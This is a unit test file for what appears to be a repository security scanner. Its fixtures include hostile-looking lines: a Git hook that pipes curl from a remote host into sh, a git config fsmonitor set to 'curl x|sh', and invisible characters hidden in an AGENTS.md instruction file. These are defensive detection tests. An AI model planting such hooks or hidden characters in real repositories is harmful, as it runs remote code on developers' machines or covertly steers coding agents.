// Unit tests for the 0.5.1 fixes (bug hunt round 4): id v2 escaping (CLI-4), Git hooks and the root .git / .hg / .svn
// (UI 1, UI 3), §32 path segments (UI 8), the detail fallback of findingText (UI 11) and the ⟨U+XXXX⟩ markers of
// zero-width and format characters (UI 12). The expected rows of the Git cases are what zes-scan.sh --full reports on the same tree
// (tests/run-tests.sh runs the CLI on it).
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { analyzeFiles } from '../../src/engine';
import { HIDDEN_CLASS } from '../../src/engine/hiddenChars';
import type { FileInput } from '../../src/engine/types';
import { findingId, idEsc } from '../../src/engine/util';
import { findingText } from '../../src/i18n';
import { visiblePath } from '../../src/lib/visiblePath';

const file = (relPath: string, text: string): FileInput => ({
  relPath, name: relPath.slice(relPath.lastIndexOf('/') + 1), size: text.length, lastModified: 0, text, sha256: null, readState: 'read',
});
const rows = async (files: FileInput[]) =>
  (await analyzeFiles(files)).findings.map((f) => `${f.level} ${f.module} ${f.path} ${f.code} ${JSON.stringify(f.params)}`).sort();

describe('id v2 escaping (CLI-4)', () => {
  const vectors = JSON.parse(readFileSync(new URL('../../../tests/id-cases.json', import.meta.url), 'utf8')) as {
    cases: { name: string; module: string; campaign: string | null; path: string | null; code: string; params: Record<string, string>; id: string; cli_only?: string }[];
  };
  it('escapes \\, | and U+001F', () => {
    expect(idEsc('a\\b|c\u001fd')).toBe('a\\\\b\\|c\\u001fd');
    expect(idEsc('plain')).toBe('plain');
  });
  // cli_only vectors hold bytes that are not valid UTF-8, which the browser never sees (TextDecoder gives U+FFFD)
  for (const c of vectors.cases.filter((x) => !x.cli_only)) {
    it(`shared vector: ${c.name}`, async () => {
      expect(await findingId(c.module, c.campaign, c.path, c.code, c.params)).toBe(c.id);
    });
  }
  it('the colliding pair of the report gives two findings', async () => {
    const r = await analyzeFiles([
      file('r/.github/workflows/w.yml', 'jobs:\n  a:\n    steps:\n      - uses: x.yml|s22.unpinned|ref=evil/b@v1\n'),
      file('r/.github/workflows/w.yml|s22.unpinned|ref=x.yml', 'jobs:\n  a:\n    steps:\n      - uses: evil/b@v1\n'),
    ]);
    const s22 = r.findings.filter((f) => f.code === 's22.unpinned');
    expect(s22.map((f) => f.path).sort()).toEqual(['r/.github/workflows/w.yml', 'r/.github/workflows/w.yml|s22.unpinned|ref=x.yml']);
    expect(new Set(s22.map((f) => f.id)).size).toBe(2);
  });
});

describe('Git hooks and the root VCS directories (UI 1, UI 3)', () => {
  it('reports hooks of the root and nested .git like the CLI, skipping *.sample', async () => {
    expect(await rows([
      file('vcs2/.git/hooks/post-checkout', '#!/bin/sh\ncurl -s https://example.invalid/x | sh\n'),
      file('vcs2/.git/hooks/pre-push.sample', '#!/bin/sh\ncurl x\n'),
      file('vcs2/.git/hooks/.hidden', '#!/bin/sh\ncurl x\n'),
      file('vcs2/sub/.git/hooks/pre-commit', '#!/bin/sh\necho hi\n'),
      file('vcs2/README', 'x\n'),
    ])).toEqual([
      'HIGH §7 vcs2/.git/hooks/post-checkout s7.git_hook_suspicious {}',
      'MEDIUM §7 vcs2/sub/.git/hooks/pre-commit s7.git_hook {}',
    ]);
  });
  it('does not walk the root .git / .hg / .svn, but reads .git/config and .git/hooks/* as the CLI does', async () => {
    expect(await rows([
      file('vcs/.git/config', '[core]\n\tfsmonitor = "curl x|sh"\n\tsshCommand = ssh -i x\n'),
      file('vcs/.git/hooks/package.json', '{"scripts":{"preinstall":"node setup.mjs"}}\n'),
      file('vcs/.git/objects/a.pkl', ''),
      file('vcs/.svn/entries', 'npm-cache.com\n'),
      file('vcs/.hg/x.js', 'fetch("https://npm-cache.com/")\n'),
      file('vcs/sub/.git/objects/b.pkl', ''),
    ])).toEqual([
      'CRITICAL §26 vcs/.git/config s26.fsmonitor {}',
      'HIGH §26 vcs/.git/config s26.ssh_command {}',
      'MEDIUM §7 vcs/.git/hooks/package.json s7.git_hook {}',
    ]);
  });
});

describe('§32 pickle extensions (UI 8)', () => {
  it('matches extensions case-insensitively and skips node_modules / .git as path segments only', async () => {
    expect(await rows([
      file('p/model.PKL', ''), file('p/x_node_modules/b.pt', ''), file('p/node_modules/q/c.pt', ''), file('p/my.git/d.pkl', ''), file('p/w.PTH', ''),
    ])).toEqual([
      'MEDIUM §32 p/model.PKL s32.pickle_model {"format":"PKL"}',
      'MEDIUM §32 p/my.git/d.pkl s32.pickle_model {"format":"pkl"}',
      'MEDIUM §32 p/x_node_modules/b.pt s32.pickle_model {"format":"pt"}',
    ]);
  });
});

describe('findingText falls back to detail (UI 11)', () => {
  it('uses detail when params do not fill every placeholder of a known code', () => {
    expect(findingText('en', { code: 's22.unpinned', params: {}, detail: 'DETAIL-missing-param' })).toBe('DETAIL-missing-param');
    expect(findingText('ja', { code: 's22.unpinned', detail: 'DETAIL-no-params' })).toBe('DETAIL-no-params');
    expect(findingText('en', { code: 's2.lifecycle_defined', params: {}, detail: 'x' })).not.toBe('x');
  });
});

describe('⟨U+XXXX⟩ markers for zero-width and format characters (UI 12)', () => {
  it('marks zero-width, format and separator characters', () => {
    const cps = [0x200b, 0x200c, 0x200d, 0x200e, 0x200f, 0x2028, 0x2029, 0x2060, 0x2061, 0x2062, 0x2063, 0x2064, 0xfeff, 0xe0041, 0xfe00, 0xe0100];
    for (const cp of cps) {
      const hex = cp.toString(16).toUpperCase().padStart(4, '0');
      expect(visiblePath(`p@${String.fromCodePoint(cp)}1.0`), hex).toBe(`p@⟨U+${hex}⟩1.0`);
    }
    expect(visiblePath('p@\ufeff\u200b\u2028zw')).toBe('p@⟨U+FEFF⟩⟨U+200B⟩⟨U+2028⟩zw');
  });
  it('keeps a U+200D that joins two emoji, and a lone U+FE0F (emoji presentation)', () => {
    expect(visiblePath('👩\u200d💻 ❤\ufe0f')).toBe('👩\u200d💻 ❤\ufe0f');
    expect(visiblePath('👍🏽\u200d👍')).toBe('👍🏽\u200d👍');
    expect(visiblePath('a\u200d💻')).toBe('a⟨U+200D⟩💻');
  });
  it('the §7 check and the markers share one definition', async () => {
    const inv = new RegExp(`[${HIDDEN_CLASS}]`, 'u');
    for (const c of ['\u200b', '\u2063', '\u2066', String.fromCodePoint(0xe007f), '\ufe0d', String.fromCodePoint(0xe01ef)]) {
      expect(inv.test(c)).toBe(true);
      expect(visiblePath(c)).toMatch(/^⟨U\+[0-9A-F]{4,5}⟩$/);
      expect(await rows([file(`a/AGENTS.md`, `be helpful${c}`)])).toEqual(['HIGH §7 a/AGENTS.md s7.invisible_chars {}']);
    }
  });
});
